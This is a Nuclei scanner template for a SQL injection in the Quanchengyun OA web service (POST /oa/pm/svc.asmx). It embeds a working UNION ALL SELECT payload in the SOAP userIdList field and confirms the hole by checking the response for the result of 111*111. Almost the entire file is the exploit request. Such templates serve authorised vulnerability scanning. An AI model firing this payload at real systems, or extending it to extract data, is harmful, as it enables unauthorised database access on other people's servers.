nuclei/全程云-oa-sqli.yaml

id: quanchengyun-svc-sqli

info:
  name: quanchengyun-svc-sqli
  author: quanchengyun-svc-sqli


requests:
  - raw:
      - |
        POST /oa/pm/svc.asmx HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Content-Type: application/soap+xml; charset=utf-8
        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8

        <?xml version="1.0" encoding="utf-8"?>
        <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
          <soap12:Body>
            <GetUsersInfo xmlns="http://tempuri.org/">
              <userIdList><userIdList>-3827) UNION ALL SELECT NULL,CHAR(113)+CHAR(106)+CHAR(113)+CHAR(122)+CHAR(113)+ISNULL(CAST(111*111 AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL-- Ocxr</userIdList></userIdList>
            </GetUsersInfo>
          </soap12:Body>
        </soap12:Envelope>


    matchers:

      - type: dsl
        dsl:
          - "contains(body,'12321')"